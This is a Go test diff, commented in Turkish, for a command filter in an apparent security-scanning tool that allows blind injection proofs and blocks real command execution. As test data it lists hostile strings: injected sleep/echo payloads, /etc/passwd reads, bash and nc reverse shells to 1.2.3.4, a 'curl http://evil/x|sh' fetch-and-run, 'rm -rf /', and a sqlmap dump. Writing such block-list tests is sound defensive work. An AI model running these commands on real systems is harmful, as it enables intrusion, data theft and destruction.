@@ -78,3 +78,34 @@ func TestActiveLight_DestructiveAndDosBlocked(t *testing.T) {
 		}
 	}
 }
+
+// active-verify-only (RCE): yalniz KOR kanit (sleep/canary) gecer; gercek komut calistirma bloklu.
+func TestActiveVerifyOnly_BlindProofAllowed(t *testing.T) {
+	allowed := []string{
+		`curl "https://target.com/ping?host=127.0.0.1;sleep+5"`,           // zaman-tabanli kor kanit
+		`curl "https://target.com/?q=echo+CyberTestifyCanary123"`,          // canary echo yansimasi
+		`curl -X POST -d "x=1;sleep 5" https://target.com/verify`,          // POST + timing (aktif ama zararsiz)
+	}
+	for _, c := range allowed {
+		if ok, m := IsBlockedHTTPCommand(c, "active-verify-only"); ok {
+			t.Errorf("active-verify-only BEKLENEN: izin ama bloklandi: %q (eslesme=%q)", c, m)
+		}
+	}
+}
+
+func TestActiveVerifyOnly_RealCommandExecBlocked(t *testing.T) {
+	blocked := []string{
+		`curl "https://target.com/?cmd=;cat /etc/passwd"`,                  // hassas dosya okuma
+		`curl "https://target.com/?cmd=;bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"`, // ters kabuk
+		`curl "https://target.com/?x=;nc -e /bin/sh 1.2.3.4 9001"`,         // nc reverse
+		`curl "https://target.com/?x=;curl http://evil/x|sh"`,              // fetch|sh
+		`curl "https://target.com/?x=;rm -rf /"`,                           // yikim
+		`curl -X DELETE https://target.com/api/user/1`,                     // active-light zaten bloklar
+		`sqlmap -u 'https://target.com/?id=1' --dump`,                      // exfil
+	}
+	for _, c := range blocked {
+		if ok, _ := IsBlockedHTTPCommand(c, "active-verify-only"); !ok {
+			t.Errorf("active-verify-only BEKLENEN: bloklanmali ama gecti: %q", c)
+		}
+	}
+}
